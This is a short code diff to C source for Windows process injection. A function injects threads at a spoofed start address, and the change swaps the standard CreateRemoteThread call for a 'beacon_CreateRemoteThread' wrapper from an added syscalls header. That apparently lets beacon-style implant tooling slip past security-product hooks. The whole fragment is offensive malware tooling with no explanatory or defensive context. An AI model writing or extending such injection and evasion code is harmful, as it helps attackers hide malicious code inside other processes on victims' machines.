@@ -1,4 +1,5 @@
 #include <stdlib.h>
+#include "syscalls.h"
 #include <stdio.h>
 #include <windows.h>
 #include <Tlhelp32.h>
@@ -25,7 +26,7 @@ BOOL inject_with_hinted_func(DWORD method, HANDLE hProcess, LPVOID lpStartAddres
 			hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pFakeAddr, lpParameter, CREATE_SUSPENDED, NULL);
 			break;
 		case PI_EXEC_CREATEREMOTETHREAD_F:
-			hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFakeAddr, lpParameter, CREATE_SUSPENDED, NULL);
+			hThread = beacon_CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFakeAddr, lpParameter, CREATE_SUSPENDED, NULL);
 			break;
 	}
 
